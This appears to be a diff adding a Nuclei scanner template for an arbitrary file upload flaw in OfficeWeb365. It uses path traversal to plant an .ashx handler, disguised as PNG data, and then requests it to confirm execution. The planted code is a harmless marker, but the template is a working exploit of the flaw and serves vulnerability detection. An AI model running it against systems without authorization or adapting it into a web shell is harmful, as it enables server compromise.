@@ -1,0 +1,55 @@
+id: poc-officeweb365-savedraw-fileupload
+info:
+  name: OfficeWeb365 SaveDraw Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  r0: "{{rand_int(10,99)}}"
+  r1: "{{rand_int(40000,44800)}}"
+  r2: "{{rand_int(40000,44800)}}"
+  r3: "{{to_number(r1) * to_number(r2)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: step-1-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/PW/SaveDraw?path=../../Content/img&idx={{r0}}.ashx"
+    body: |
+      data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
+      {
+      public void ProcessRequest(System.Web.HttpContext context)
+      {
+      System.Web.HttpResponse response = context.Response;
+      response.Write({{r1}} * {{r2}});
+      response.Write("\nThis website has a vulnerability");
+      string filePath = context.Server.MapPath("/") + context.Request.Path;
+      }
+      public bool IsReusable
+      {
+      get { return false; }
+      }
+      }///---
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: step-2-verify
+    method: GET
+    path:
+      - "{{BaseURL}}/Content/img/UserDraw/drawPW{{r0}}.ashx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{r3}}"
+      - type: word
+        words:
+          - "This website has a vulnerability"
